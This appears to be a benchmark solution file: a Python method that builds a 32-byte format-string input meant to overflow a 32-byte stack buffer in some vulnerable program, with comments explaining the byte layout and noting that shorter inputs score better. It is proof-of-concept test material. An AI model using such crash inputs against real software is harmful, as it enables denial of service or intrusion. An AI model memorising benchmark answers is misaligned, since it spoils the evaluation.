class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the vulnerability.

        Args:
            src_path: Path to the vulnerable source code tarball

        Returns:
            bytes: The PoC input that should trigger the vulnerability
        """
        # The vulnerability description implies a stack buffer overflow due to a
        # format string specifier being copied into a 32-byte buffer. To trigger
        # the overflow, the specifier's length must be at least 32 characters,
        # which will cause the NUL terminator to be written out of bounds.

        # The scoring rewards shorter PoCs. The minimum length to cause an
        # overflow is 32.

        # The description mentions several components of a format string:
        # modifier, width, period, precision. To create a robust PoC that is
        # likely to trigger the vulnerable code path, we include all of them.
        # We use 'll' as the modifier, as it's standard for 64-bit integers,
        # which are mentioned in the context of the vulnerability.

        # The structure of our 32-byte PoC is:
        # %      (1 byte)
        # ll     (2 bytes) - modifier
        # 1...1  (13 bytes) - width
        # .      (1 byte) - separator
        # 1...1  (14 bytes) - precision
        # d      (1 byte) - specifier
        # Total length: 1 + 2 + 13 + 1 + 14 + 1 = 32 bytes.

        return b"%ll1111111111111.11111111111111d"